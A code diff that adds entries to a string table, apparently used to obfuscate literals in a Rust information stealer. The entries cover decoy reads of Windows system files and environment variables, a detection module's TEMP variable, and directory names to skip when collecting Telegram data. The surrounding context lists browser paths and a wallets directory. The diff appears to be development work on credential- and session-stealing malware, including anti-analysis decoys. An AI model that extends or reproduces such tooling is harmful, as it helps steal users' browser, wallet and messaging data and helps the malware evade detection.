@@ -567,6 +567,33 @@ STRINGS = [
     # === paths.rs - all_browsers() bare literals ===
     ("paths_wallets_dir", "wallets"),
     ("paths_opera_neon", "Opera Neon"),
+
+    # === decoy.rs - hardcoded system paths ===
+    ("decoy_win_ini", r"C:\Windows\win.ini"),
+    ("decoy_hosts", r"C:\Windows\System32\drivers\etc\hosts"),
+    ("decoy_lmhosts", r"C:\Windows\System32\drivers\etc\lmhosts.sam"),
+    ("decoy_iecount", r"C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\INetCache\ie\counter.dat"),
+    ("decoy_pf_env", "ProgramFiles"),
+    ("decoy_local_env", "LOCALAPPDATA"),
+    ("decoy_edge_path", r"Microsoft\Edge\Application"),
+    ("decoy_chrome_path", r"Google\Chrome\Application"),
+    ("decoy_json_dummy", r#"{"name":"test","value":123}"#),
+    ("decoy_env_os", "OS"),
+    ("decoy_env_proc_arch", "PROCESSOR_ARCHITECTURE"),
+    ("decoy_env_num_procs", "NUMBER_OF_PROCESSORS"),
+    ("decoy_env_sysroot", "SystemRoot"),
+    ("decoy_env_user", "USER"),
+
+    # === detection.rs - remaining hardcoded env var ===
+    ("det_temp_env", "TEMP"),
+
+    # === telegram/mod.rs - excluded directory names ===
+    ("tg_excl_dumps", "dumps"),
+    ("tg_excl_emoji", "emoji"),
+    ("tg_excl_temp", "temp"),
+    ("tg_excl_user_data", "user_data"),
+    ("tg_excl_user_data_prefix", "user_data#"),
+    ("tg_collect_prefix", "telegram"),
 ]
 
 
